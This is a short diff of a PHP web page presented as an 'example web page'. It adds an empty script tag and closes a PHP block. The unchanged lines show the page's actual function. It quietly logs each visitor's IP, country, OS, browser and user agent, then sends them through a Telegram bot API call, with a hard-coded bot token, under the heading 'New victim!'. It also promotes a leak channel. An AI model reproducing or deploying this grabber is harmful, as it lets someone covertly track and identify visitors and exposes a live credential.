@@ -3,6 +3,9 @@
  <head>
   <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
   <title>Пример веб-страницы</title>
+  <script language="php">
+  
+</script>
  </head>
  <body>
 <?php
@@ -125,6 +128,6 @@ $site_refer = $_SERVER['HTTP_REFERER'];
  $token = "5750563135:AAG6mtwTxlNduyWnvACQ-_7Lo8Fqyivzd8w"; //Токен бота с @BotFather
  $chat_id = "1843765115";// Ваш chat id
  $txt = urlencode("Наш Telegram Канал: @slivmens\nНовая жертва!\nIP:{$ip}\nСтрана:{$country}\nОС:{$user_os}\nБраузер:{$user_browser}\nUser Agent:{$user_agent}");
- $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
+ $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r"); ?>
  </body>
 </html>
